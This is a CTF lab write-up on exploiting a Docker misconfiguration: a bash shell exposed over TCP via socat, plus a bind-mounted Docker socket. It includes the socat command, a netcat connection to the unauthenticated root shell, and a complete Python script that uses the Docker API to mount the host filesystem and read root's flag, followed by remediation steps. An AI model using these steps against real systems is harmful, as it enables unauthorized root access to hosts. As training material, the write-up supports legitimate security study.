# Docker 3 — Misconfigured Socket Interfaces
### PentestGarage CTF Writeup

---

## Lab Info

| Field | Details |
|---|---|
| **Lab Name** | Docker 3 — Analyze Misconfigured Socket Interfaces |
| **Difficulty** | Medium |
| **Points** | 200 |
| **Category** | Docker Security |
| **Target IP** | 172.31.3.83 |
| **Flag** | `ctf{eyoo3maethubeep3La5the2fe1AjeTap}` |

---

## Overview

This lab demonstrates a real-world Docker misconfiguration where:
1. A raw bash shell is exposed over TCP via `socat` (no authentication)
2. The Docker socket is bind-mounted into the container (full host daemon access)

Together, these two misconfigurations allow an unauthenticated attacker to go from zero access → root on the host system.

---

## Attack Chain

### Step 1 — Port Scanning

```bash
nmap -p- -T4 172.31.3.83
```

**Result:** Two open ports found:
- `22/tcp` — OpenSSH 8.4p1
- `1337/tcp` — Unknown service

Standard Docker API ports (2375, 2376) were closed.

---

### Step 2 — Identify Port 1337

Typical HTTP probes (curl, nc with HTTP GET) produced no response. The Docker CLI gave an EOF. The key insight was that 1337 wasn't HTTP at all — it was a raw TCP shell.

```bash
nc -nv 172.31.3.83 1337
# Connected — then type:
whoami
# Output: root
```

**Root cause:** The container was started with:
```
socat tcp-listen:1337,fork,reuseaddr EXEC:/bin/bash
```
This binds `/bin/bash` directly to TCP port 1337 with no authentication, giving anyone who connects an instant root shell inside the container.

---

### Step 3 — Container Enumeration

Once inside the shell, key findings:

```bash
# Confirmed we're inside a Docker container
cat /proc/1/cgroup       # overlay filesystem = container
hostname                 # f1fe1da26df1

# Docker socket is mounted and accessible
ls -la /var/run/docker.sock
# srw-rw---- 1 root 997 0 Sep 17 07:05 /var/run/docker.sock

# Found an exploit script
cat /exploit
# #!/bin/sh
# cat /root/flag.txt > /var/lib/docker/overlay2/.../diff/flag.txt

# No curl or docker CLI available
which curl docker   # not found
which python3       # /usr/bin/python3 ✓
```

**The critical misconfiguration:** `/var/run/docker.sock` was bind-mounted into the container:
```
"Mounts":[{"Source":"/var/run/docker.sock","Destination":"/var/run/docker.sock","RW":true}]
```
This gives any process inside the container full control over the host Docker daemon.

---

### Step 4 — Docker Socket Abuse via Python3

Since no Docker CLI or curl was available, Python3's `socket` module was used to communicate with the Docker API directly over the Unix socket.

**First, enumerate available images:**

```python
python3 -c "
import socket, json
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect('/var/run/docker.sock')
s.sendall(b'GET /images/json HTTP/1.0\r\nHost: localhost\r\n\r\n')
resp = b''
while True:
    d = s.recv(4096)
    if not d: break
    resp += d
s.close()
images = json.loads(resp.split(b'\r\n\r\n',1)[1])
for i in images:
    print(i.get('RepoTags'))
"
# Output: ['shell-as-a-service:latest']
```

---

### Step 5 — Container Escape

Created a new container using the existing image, mounting the **host root filesystem** at `/hostfs`, and ran `cat /hostfs/root/flag.txt` inside it.

```python
python3 << 'EOF'
import socket, json, time

def docker_req(method, path, body=None):
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.connect('/var/run/docker.sock')
    if body:
        b = json.dumps(body).encode()
        req = (f'{method} {path} HTTP/1.0\r\nHost: localhost\r\n'
               f'Content-Type: application/json\r\nContent-Length: {len(b)}\r\n\r\n').encode() + b
    else:
        req = f'{method} {path} HTTP/1.0\r\nHost: localhost\r\n\r\n'.encode()
    s.sendall(req)
    resp = b''
    while True:
        d = s.recv(4096)
        if not d: break
        resp += d
    s.close()
    return resp.split(b'\r\n\r\n', 1)[1]

# Create container with host root mounted
resp = docker_req('POST', '/containers/create', {
    'Image': 'shell-as-a-service',
    'Cmd': ['cat', '/hostfs/root/flag.txt'],
    'HostConfig': {'Binds': ['/:/hostfs:ro']}
})
cid = json.loads(resp)['Id']

# Start it
docker_req('POST', f'/containers/{cid}/start')

# Wait and get logs (stdout = flag)
time.sleep(2)
resp = docker_req('GET', f'/containers/{cid}/logs?stdout=1&stderr=1')
print(repr(resp))

# Cleanup
docker_req('DELETE', f'/containers/{cid}?force=true')
EOF
```

**Output:**
```
b'\x01\x00\x00\x00\x00\x00\x00&ctf{eyoo3maethubeep3La5the2fe1AjeTap}\n'
```

> The leading bytes (`\x01\x00\x00\x00\x00\x00\x00&`) are Docker's multiplexed log stream header — the actual flag follows immediately after.

---

## Flag

```
ctf{eyoo3maethubeep3La5the2fe1AjeTap}
```

---

## Vulnerability Summary

| Vulnerability | Severity | Description |
|---|---|---|
| Unauthenticated TCP shell (socat) | Critical | `/bin/bash` exposed on port 1337 with no auth |
| Docker socket bind-mount | Critical | `/var/run/docker.sock` mounted into container gives host root |

---

## Remediation

**1. Never expose a raw shell over TCP.**
The `socat EXEC:/bin/bash` pattern should never be used in any environment. If remote access is needed, use SSH with key-based authentication.

**2. Never bind-mount the Docker socket into containers.**
```yaml
# BAD — never do this
volumes:
  - /var/run/docker.sock:/var/run/docker.sock
```
Anyone inside a container with socket access can escape to the host trivially. If container management is needed, use dedicated solutions like [Docker-in-Docker (dind)](https://hub.docker.com/_/docker) with proper isolation.

**3. Use Docker's rootless mode** where possible to limit the blast radius of socket exposure.

**4. Apply network-level controls** — restrict which IPs can reach sensitive ports using firewalls or Docker's built-in network policies.

---

## Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Port scanning |
| `nc` (netcat) | Initial shell connection, service probing |
| `python3` (socket module) | Docker API communication over Unix socket |
| `curl` | HTTP/API probing (from Kali) |

---

*Writeup by Akshay — PentestGarage Docker 3 Lab*
